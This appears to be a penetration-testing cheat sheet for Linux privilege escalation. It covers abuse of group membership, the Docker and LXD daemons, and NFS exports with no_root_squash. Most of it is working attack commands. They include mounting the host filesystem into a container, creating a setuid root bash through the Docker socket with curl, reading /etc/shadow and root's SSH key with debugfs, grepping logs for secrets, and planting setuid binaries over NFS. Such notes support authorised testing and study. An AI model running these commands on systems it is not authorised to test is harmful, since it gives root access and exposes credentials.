# Groups, containers, and NFS

## Check group / socket / daemon
Group name alone is not enough: confirm the socket and rootful daemon.

```bash
id
groups
getent group docker
getent group lxd
ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket 2>/dev/null
docker version 2>/dev/null
lxc list 2>/dev/null
```

## Interesting groups
| Group | Abuse |
| --- | --- |
| `disk` | raw block access, bypass file perms → `debugfs` below |
| `adm` | `/var/log` readable → `grep -riE 'pass|secret|token' /var/log 2>/dev/null` |
| `shadow` | `/etc/shadow` group-readable → `cat /etc/shadow`, crack offline |
| `video` | framebuffer dump → below |
| `staff` | often group-writable `/usr/local`: `ls -ld /usr/local/bin`, check PATH order against a root job → [PATH hijack](root-run.md#path-and-relative-commands-in-root-scripts) |
| `sudo` / `wheel` | member only: still needs the password, no bypass by group membership alone |
| `docker` / `lxd` | below |
| any custom group | `find / -xdev -group <GROUP> -ls 2>/dev/null` for files it owns |

Raw disk read with `disk` (no filesystem permission check):
```bash
lsblk
debugfs -R 'cat /etc/shadow' /dev/<DEVICE>
debugfs -R 'cat /root/.ssh/id_rsa' /dev/<DEVICE>
```
- `<DEVICE>` = the partition holding `/`, from `lsblk` or `mount`.

Framebuffer dump with `video` (screen contents, not a shell):
```bash
cat /sys/class/graphics/fb0/virtual_size
cat /sys/class/graphics/fb0/bits_per_pixel
cat /dev/fb0 > screen.raw
```
- Convert on Kali once you have width/height/bpp: `ffmpeg -vcodec rawvideo -f rawvideo -pix_fmt rgb565 -s <W>x<H> -i screen.raw screen.png` (pixel format depends on bpp: 16 → `rgb565`, 32 → `bgra`).

## Docker (rootful socket accessible)
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- Rootless Docker ≠ host root.
- No internet: needs an `alpine` image already local (`docker images`), or any other local image in place of `alpine`.

No `docker` client binary, socket is in-group reachable:
```bash
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -X POST \
  -d '{"Image":"<IMAGE>","Cmd":["chroot","/mnt","/bin/sh","-c","cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"],"HostConfig":{"Binds":["/:/mnt"]}}' \
  http://localhost/containers/create > create.json
id=$(grep -o '"Id":"[a-f0-9]*"' create.json | head -1 | cut -d'"' -f4)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$id/start
```
```bash
/tmp/rootbash -p
```
- `<IMAGE>` = any name from the first command's output. Same no-internet limit as above.

## LXD (daemon accessible)
```bash
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine c -c security.privileged=true
lxc config device add c d disk source=/ path=/mnt
lxc start c
lxc exec c sh
```
- Host filesystem is under `/mnt` inside the container.
- Skip the `image import` if `lxc image list` already shows an image.

No image anywhere and no internet on the target: build one on Kali, transfer the tarball.
```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && sudo ./build-alpine
```
Transfer `alpine-*.tar.gz` to the target, then `lxc image import` as above.

## NFS
```bash
cat /etc/exports 2>/dev/null
findmnt
showmount -e <IP>
```

`no_root_squash` + writable export + root on your client + compatible bash. On Kali:
```bash
mkdir /mnt/x
mount -o rw,vers=3 <IP>:/export /mnt/x
cp /bin/bash /mnt/x/rootbash
chmod +s /mnt/x/rootbash
```
On target:
```bash
/export/rootbash -p
```
- Copy a bash that runs on the target's glibc.
